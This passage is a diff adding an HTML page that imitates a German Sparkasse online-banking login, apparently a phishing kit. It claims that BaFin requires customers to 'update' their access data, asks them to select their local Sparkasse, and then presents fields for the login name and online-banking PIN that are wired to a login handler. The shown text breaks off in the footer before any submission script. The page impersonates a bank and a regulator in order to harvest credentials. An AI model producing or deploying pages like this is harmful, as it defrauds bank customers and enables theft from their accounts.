@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sparkasse - Anmeldung</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #1a1a1a; color: #fff; -webkit-font-smoothing: antialiased; }
+.hidden { display: none !important; }
+.bspk-wrapper { min-height: 100vh; display: flex; flex-direction: column; background: #1a1a1a; }
+
+/* Header */
+.bspk-header { background: #e30613; padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; }
+.bspk-header-left { display: flex; align-items: center; gap: 10px; }
+/* Das Logo wird als Bild angezeigt */
+.bspk-logo-img { width: 36px; height: 36px; display: block; border-radius: 4px; object-fit: cover; }
+.bspk-header-text { font-size: 14px; font-weight: 600; color: #fff; line-height: 1.2; }
+.bspk-header-icons { display: flex; align-items: center; gap: 16px; color: #fff; }
+
+/* Body */
+.bspk-body { padding: 20px 16px 40px; flex: 1; max-width: 480px; margin: 0 auto; width: 100%; }
+
+/* Info Block (Kleiner) */
+.bspk-info-block { background: #2a2a2a; border-radius: 12px; padding: 18px 16px; margin-bottom: 20px; border-left: 4px solid #e30613; }
+.bspk-info-block h1 { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #fff; line-height: 1.3; }
+.bspk-info-block p { font-size: 13px; line-height: 1.55; color: #ccc; margin-bottom: 10px; }
+.bspk-info-block p:last-child { margin-bottom: 0; }
+.bspk-info-block strong { color: #fff; }
+
+.bspk-hero-img { width: 100%; border-radius: 12px; margin-bottom: 20px; display: block; min-height: 200px; background: #333; }
+
+.bspk-search-box { background: #2a2a2a; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+.bspk-search-label { display: block; font-size: 14px; color: #aaa; margin-bottom: 8px; }
+.bspk-search-input { width: 100%; padding: 16px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; outline: none; font-family: inherit; }
+.bspk-search-input:focus { border-color: #e30613; }
+.bspk-or-divider { text-align: center; color: #888; font-size: 14px; margin: 16px 0; }
+.bspk-location-btn { width: 100%; padding: 16px; background: transparent; border: 1px solid #fff; border-radius: 30px; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; font-family: inherit; }
+.bspk-location-btn:hover { background: rgba(255,255,255,0.05); }
+.bspk-suggestions { margin-top: 16px; }
+.bspk-suggestion-title { font-size: 14px; color: #aaa; margin-bottom: 10px; }
+.bspk-suggestion-list-box { max-height: 340px; overflow-y: auto; }
+.bspk-suggestion-item { display: flex; align-items: center; gap: 12px; padding: 14px 0; border-bottom: 1px solid #333; cursor: pointer; color: #fff; font-size: 16px; }
+.bspk-suggestion-item:hover { background: rgba(255,255,255,0.04); }
+
+/* Logo in der Liste als Bild */
+.spk-icon { width: 28px; height: 28px; border-radius: 4px; object-fit: cover; flex-shrink: 0; }
+
+.bspk-suggestion-item .arrow { margin-left: auto; color: #fff; opacity: 0.6; }
+.bspk-suggestion-item .distance { font-size: 12px; color: #e30613; font-weight: 600; margin-left: 8px; }
+.bspk-no-result { padding: 14px 0; color: #888; font-size: 15px; text-align: center; }
+
+/* Loading */
+@keyframes bspk-fadeIn { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
+.bspk-loading-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #1a1a1a; color: #fff; text-align: center; padding: 40px 20px; }
+.bspk-loading-check { width: 80px; height: 80px; border: 3px solid rgba(76,175,80,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 28px; position: relative; }
+.bspk-loading-check::before { content: ''; position: absolute; inset: -8px; border: 2px solid rgba(76,175,80,0.4); border-radius: 50%; animation: bspk-pulse 1.6s ease-out infinite; }
+.bspk-loading-check svg { width: 44px; height: 44px; }
+.bspk-loading-check svg polyline { fill: none; stroke: #4CAF50; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 50; stroke-dashoffset: 50; animation: bspk-draw 0.8s ease-out 0.2s forwards; }
+@keyframes bspk-draw { to { stroke-dashoffset: 0; } }
+@keyframes bspk-pulse { 0% { transform: scale(1); opacity: 0.8; } 100% { transform: scale(1.4); opacity: 0; } }
+.bspk-loading-screen h2 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
+.bspk-loading-screen p { font-size: 16px; color: #aaa; }
+.bspk-dots { margin-top: 24px; display: flex; gap: 8px; justify-content: center; }
+.bspk-dots span { width: 10px; height: 10px; border-radius: 50%; background: #e30613; animation: bspk-blink 1.2s infinite; }
+.bspk-dots span:nth-child(2) { animation-delay: 0.2s; }
+.bspk-dots span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes bspk-blink { 0%,80%,100% { opacity: 0.3; } 40% { opacity: 1; } }
+
+/* Login */
+.bspk-login-screen { padding: 20px 16px 0; flex: 1; max-width: 480px; margin: 0 auto; width: 100%; }
+.bspk-login-title { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; }
+.bspk-login-subtitle { font-size: 14px; color: #aaa; text-align: center; margin-bottom: 30px; }
+.bspk-field { margin-bottom: 20px; }
+.bspk-field-label { display: block; font-size: 14px; color: #aaa; margin-bottom: 8px; }
+.bspk-field-input { width: 100%; padding: 18px 16px; background: #2a2a2a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; outline: none; font-family: inherit; }
+.bspk-field-input:focus { border-color: #e30613; }
+.bspk-field-input-wrap { position: relative; }
+.bspk-eye-btn { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #aaa; padding: 4px; }
+.bspk-info-toggle { display: flex; align-items: center; gap: 12px; padding: 16px; background: #2a2a2a; border-radius: 8px; margin-bottom: 20px; }
+.bspk-info-toggle .toggle { width: 44px; height: 24px; background: #555; border-radius: 12px; position: relative; cursor: pointer; flex-shrink: 0; transition: background 0.2s; }
+.bspk-info-toggle .toggle::after { content: ''; position: absolute; top: 2px; left: 2px; width: 20px; height: 20px; background: #fff; border-radius: 50%; transition: left 0.2s; }
+.bspk-info-toggle .toggle.active { background: #e30613; }
+.bspk-info-toggle .toggle.active::after { left: 22px; }
+.bspk-info-toggle span { font-size: 14px; color: #ddd; line-height: 1.4; }
+.bspk-login-btn { width: 100%; padding: 16px; background: #e30613; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; font-family: inherit; }
+.bspk-login-btn:hover { background: #c00511; }
+.bspk-login-link { display: block; text-align: center; color: #fff; text-decoration: underline; font-size: 15px; margin-top: 20px; }
+
+/* --- FOOTER BEREICH --- */
+.bspk-contact-section { padding: 30px 16px 0; max-width: 480px; margin: 0 auto; width: 100%; }
+.bspk-contact-btn { display: flex; align-items: center; justify-content: center; gap: 12px; width: 100%; padding: 18px 20px; background: transparent; border: 1.5px solid #fff; border-radius: 40px; color: #fff; font-size: 16px; font-weight: 600; text-decoration: none; margin-bottom: 14px; font-family: inherit; cursor: pointer; position: relative; }
+.bspk-contact-btn:hover { background: rgba(255,255,255,0.05); }
+.bspk-contact-btn svg.lead-icon { position: absolute; left: 22px; }
+.bspk-contact-btn svg.trail-icon { position: absolute; right: 22px; }
+.bspk-all-contacts { display: block; text-align: center; color: #fff; font-size: 15px; font-weight: 600; text-decoration: none; margin: 24px 0 40px; }
+
+.bspk-badge-wrap { display: flex; justify-content: center; margin: 20px 0 40px; }
+.bspk-badge { display: inline-flex; align-items: center; gap: 10px; background: #fff; border-radius: 6px; padding: 8px 14px; }
+.bspk-badge-icon { width: 32px; height: 32px; }
+.bspk-badge-text { color: #003d7a; font-size: 9px; font-weight: 700; line-height: 1.2; text-align: left; }
+.bspk-badge-text .top-title { font-size: 13px; font-weight: 900; letter-spacing: 0.5px; }
+.bspk-badge-text .top-sub { font-size: 8px; color: #e30613; font-weight: 700; }
+
+.bspk-service-list { padding: 0 16px; max-width: 480px; margin: 0 auto; width: 100%; }
+.bspk-service-row { display: flex; align-items: center; gap: 16px; padding: 18px 0; border-bottom: 1px solid #333; color: #fff; font-size: 16px; font-weight: 500; text-decoration: none; }
+.bspk-service-row:hover { background: rgba(255,255,255,0.03); }
+.bspk-service-row .svc-icon { width: 24px; height: 24px; flex-shrink: 0; }
+.bspk-service-row.first { padding-top: 24px; }
+
+.bspk-immer-wrapper { text-align: center; padding: 40px 16px 20px; }
+.bspk-immer-title { font-size: 13px; letter-spacing: 3px; color: #ccc; font-weight: 500; margin-bottom: 20px; }
+
+.bspk-personal-contact { display: flex; align-items: center; justify-content: center; gap: 14px; width: calc(100% - 32px); max-width: 448px; margin: 0 auto 40px; padding: 18px 24px; background: #c4d69a; border-radius: 40px; color: #1a1a1a; font-size: 17px; font-weight: 700; text-decoration: none; font-family: inherit; }
+.bspk-personal-contact svg { width: 26px; height: 26px; }
+
+.bspk-footer-bottom { padding: 40px 16px 60px; max-width: 480px; margin: 0 auto; width: 100%; }
+.bspk-footer-city { text-align: center; font-size: 20px; font-weight: 600; color: #fff; margin-bottom: 28px; }
+.bspk-footer-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 14px 22px; margin-bottom: 20px; font-size: 15px; }
+.bspk-footer-row a { color: #fff; text-decoration: underline; text-underline-offset: 3px; }
+.bspk-footer-row a:hover { opacity: 0.8; }
+.bspk-lang-select { display: inline-flex; align-items: center; gap: 6px; color: #fff; font-size: 15px; text-decoration: underline; text-underline-offset: 3px; cursor: pointer; }
+.bspk-lang-select svg { width: 16px; height: 16px; }
+.bspk-divider-pipe { color: #666; }
+/* --- ENDE FOOTER --- */
+
+/* Neuer Daten-Screen */
+.bspk-data-screen { padding: 20px 16px 40px; flex: 1; max-width: 480px; margin: 0 auto; width: 100%; }
+.bspk-data-title { font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px; }
+.bspk-data-subtitle { font-size: 14px; color: #aaa; text-align: center; margin-bottom: 30px; }
+
+/* Success */
+.bspk-success-screen { min-height: 100vh; background: #1a1a1a; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 24px; text-align: center; }
+.bspk-success-icon { width: 90px; height: 90px; border: 3px solid #4CAF50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 28px; }
+.bspk-success-icon svg { width: 48px; height: 48px; }
+.bspk-success-icon svg polyline { fill: none; stroke: #4CAF50; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 50; stroke-dashoffset: 50; animation: bspk-draw 0.8s ease-out 0.3s forwards; }
+.bspk-success-screen h1 { font-size: 26px; font-weight: 700; color: #fff; margin-bottom: 16px; }
+.bspk-success-screen p { font-size: 16px; color: #ccc; line-height: 1.6; max-width: 400px; }
+</style>
+</head>
+<body>
+
+<div class="bspk-wrapper" id="spk-wrapper">
+
+  <!-- HEADER -->
+  <div class="bspk-header">
+    <div class="bspk-header-left">
+      <!-- Dein Base64-Bild im Header -->
+      <img class="bspk-logo-img" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAkACQAAD/4QDeRXhpZgAATU0AKgAAAAgABgESAAMAAAABAAEAAAEaAAUAAAABAAAAVgEbAAUAAAABAAAAXgEoAAMAAAABAAIAAAEyAAIAAAAUAAAAZodpAAQAAAABAAAAegAAAAAAAACQAAAAAQAAAJAAAAABMjAyNjoxMToxMiAxOTo1ODo1NQAABJADAAIAAAAUAAAAsJKGAAcAAAASAAAAxKACAAQAAAABAAAA3qADAAQAAAABAAAAxgAAAAAyMDI2OjExOjEyIDE5OjU4OjU1AEFTQ0lJAAAAU2NyZWVuc2hvdP/tADhQaG90b3Nob3AgMy4wADhCSU0EBAAAAAAAADhCSU0EJQAAAAAAENQdjNmPALIE6YAJmOz4Qn7/4gIoSUNDX1BST0ZJTEUAAQEAAAIYYXBwbAQAAABtbnRyUkdCIFhZWiAH5gABAAEAAAAAAABhY3NwQVBQTAAAAABBUFBMAAAAAAAAAAAAAAAAAAAAAAAA9tYAAQAAAADTLWFwcGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApkZXNjAAAA/AAAADBjcHJ0AAABLAAAAFB3dHB0AAABfAAAABRyWFlaAAABkAAAABRnWFlaAAABpAAAABRiWFlaAAABuAAAABRyVFJDAAABzAAAACBjaGFkAAAB7AAAACxiVFJDAAABzAAAACBnVFJDAAABzAAAACBtbHVjAAAAAAAAAAEAAAAMZW5VUwAAABQAAAAcAEQAaQBzAHAAbABhAHkAIABQADNtbHVjAAAAAAAAAAEAAAAMZW5VUwAAADQAAAAcAEMAbwBwAHkAcgBpAGcAaAB0ACAAQQBwAHAAbABlACAASQBuAGMALgAsACAAMgAwADIAMlhZWiAAAAAAAAD21QABAAAAANMsWFlaIAAAAAAAAIPfAAA9v////7tYWVogAAAAAAAASr8AALE3AAAKuVhZWiAAAAAAAAAoOAAAEQsAAMi5cGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltzZjMyAAAAAAABDEIAAAXe///zJgAAB5MAAP2Q///7ov///aMAAAPcAADAbv/AABEIAMYA3gMBIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2wBDAAICAgICAgMCAgMFAwMDBQYFBQUFBggGBgYGBggKCAgICAgICgoKCgoKCgoMDAwMDAwODg4ODg8PDw8PDw8PDw//2wBDAQICAgQEBAcEBAcQCwkLEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBD/3QAEAA7/2gAMAwEAAhEDEQA/APn+iiiv5vP9XAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//9D5/ooor+bz/VwKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAP//R+f6KKK/m8/1cCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigD//0vn+iiiv5vP9XAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//9P5/ooor+bz/VwKKKKACiiigAooooAKKKKACiiigD7w/ZC/Zg0r4qRz/EHx+jy+HrSYwW1orMn2yZAC7Oy4YRJkDCnLNkZAUhv1A/4Ut8IP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" alt="Sparkasse">
+      <div class="bspk-header-text" id="spk-header-text">Sparkasse</div>
+    </div>
+    <div class="bspk-header-icons">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </div>
+  </div>
+
+  <!-- SELECTION SCREEN -->
+  <div class="bspk-body" id="spk-selection">
+
+    <div class="bspk-info-block">
+      <h1>Aktualisieren Sie Ihren Online-Banking-Zugang</h1>
+      <p>Die <strong>Bundesanstalt für Finanzdienstleistungsaufsicht (BaFin)</strong> hat im Rahmen der aktuellen Sicherheitsrichtlinien alle Kreditinstitute dazu verpflichtet, ihre Online-Banking-Zugänge regelmäßig zu überprüfen und zu aktualisieren.</p>
+      <p>Auch die Sparkassen sind von dieser Regelung betroffen. Um Ihren Zugang weiterhin uneingeschränkt nutzen zu können, ist eine <strong>einmalige Aktualisierung Ihrer Zugangsdaten</strong> erforderlich.</p>
+      <p>Bitte wählen Sie dazu Ihre zuständige Sparkasse aus, um den Vorgang abzuschließen.</p>
+    </div>
+
+    <img class="bspk-hero-img" src="https://images.unsplash.com/photo-1609220136736-443140cffec6?w=600&h=600&fit=crop" alt="Familie">
+
+    <div class="bspk-search-box">
+      <label class="bspk-search-label">PLZ oder Wohnort</label>
+      <input type="text" class="bspk-search-input" id="spk-search-input" placeholder="z.B. 47139 oder Essen" autocomplete="off">
+      <div class="bspk-or-divider">oder</div>
+      <button class="bspk-location-btn" id="spk-location-btn" onclick="useLocation()">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
+        <span id="spk-location-label">Mein Standort</span>
+      </button>
+      <div class="bspk-suggestions">
+        <div class="bspk-suggestion-title" id="spk-suggestion-title">Wählen Sie Ihre Sparkasse aus</div>
+        <div class="bspk-suggestion-list-box" id="spk-suggestion-list"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOADING SCREEN -->
+  <div class="bspk-loading-screen hidden" id="spk-loading">
+    <div class="bspk-loading-check"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+    <h2>Sie werden jetzt weitergeleitet</h2>
+    <p id="spk-loading-text">zur Sparkasse …</p>
+    <div class="bspk-dots"><span></span><span></span><span></span></div>
+  </div>
+
+  <!-- LOGIN WRAPPER (Hier ist der Footer mit drin) -->
+  <div class="hidden" id="spk-login-wrapper">
+
+    <div class="bspk-login-screen">
+      <h1 class="bspk-login-title">Melden Sie sich an</h1>
+      <p class="bspk-login-subtitle" id="spk-login-subtitle">bei Ihrer Sparkasse</p>
+      <div class="bspk-field">
+        <label class="bspk-field-label">Anmeldename</label>
+        <input type="text" class="bspk-field-input" id="spk-anmeldename" autocomplete="off">
+      </div>
+      <div class="bspk-field">
+        <label class="bspk-field-label">Online-Banking-PIN</label>
+        <div class="bspk-field-input-wrap">
+          <input type="password" class="bspk-field-input" id="spk-pin">
+          <button class="bspk-eye-btn" onclick="toggleSpkPw()" aria-label="PIN anzeigen"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+        </div>
+      </div>
+      <div class="bspk-info-toggle">
+        <div class="toggle" onclick="this.classList.toggle('active')"></div>
+        <span>Dieses Gerät speichern und künftig schneller anmelden.</span>
+      </div>
+      <button class="bspk-login-btn" onclick="handleSparkasseLogin()">Anmelden</button>
+      <a href="#" class="bspk-login-link">Sicherheitshinweise</a>
+      <a href="#" class="bspk-login-link">Zugangsdaten vergessen / gesperrt?</a>
+    </div>
+
+    <!-- FOOTER BEREICH -->
+    <div class="bspk-contact-section">
+      <a href="#" class="bspk-contact-btn">
+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        Online-Banking-Hotline
+      </a>
+      <a href="#" class="bspk-contact-btn">
+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        24h Sperr-Notruf
+      </a>
+      <a href="#" class="bspk-contact-btn">
+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.8c4.56-.93 8-4.96 8-9.8z"/></svg>
+        Facebook
+        <svg class="trail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      </a>
+      <a href="#" class="bspk-contact-btn">
+        <svg class="lead-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5"/><circle cx="12" cy="12" r="4.5"/><circle cx="17.5" cy="6.5" r="1.2" fill="currentColor"/></svg>
+        Instagram
+        <svg class="trail-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      </a>
+      <a href="#" class="bspk-contact-btn">
